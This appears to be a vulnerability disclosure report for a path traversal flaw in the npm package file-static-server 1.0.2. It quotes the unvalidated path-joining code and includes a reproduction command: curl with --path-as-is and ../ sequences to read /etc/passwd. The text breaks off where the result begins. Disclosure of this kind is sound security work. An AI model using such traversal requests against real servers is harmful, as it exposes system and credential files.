Summary:

Hi Guys,

There is Path Traversal vulnerability in file-static-server module, which allows to read arbitrary file from the remote server.

## Module

**file-static-server**

[no description provided]

https://www.npmjs.com/package/file-static-server

version: 1.0.2

## Description

Vulnerability exists, because function which creates path for file to read does not implement any validation of input data and takes path just as is:

```javascript
// ./node_modules/file-static-server/lib/file.js, line 21:
getFilePath: function () {
    if (this.filePath) {
      return this.filePath
    }
    var url = this.req.url
    var len = process.argv.length
    this.filePath = path.join(process.argv[len - 1], url)
    return this.filePath
  },
```

```this.filePath``` is the used directly in function, which reads file:

```javascript
// ./node_modules/file-static-server/lib/file.js, line 87:
getStream: function () {
    return fs.createReadStream(this.filePath)
  }
```

## Steps To Reproduce:

- install ```file-static-server``` module

```
$ npm install file-static-server
```

- run server from command line:

```
$ ./node_modules/file-static-server/bin/file-static-server -P 8080 ./
server start at 8080
```

- use following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
```

Result:

```

* TCP_NODELAY set
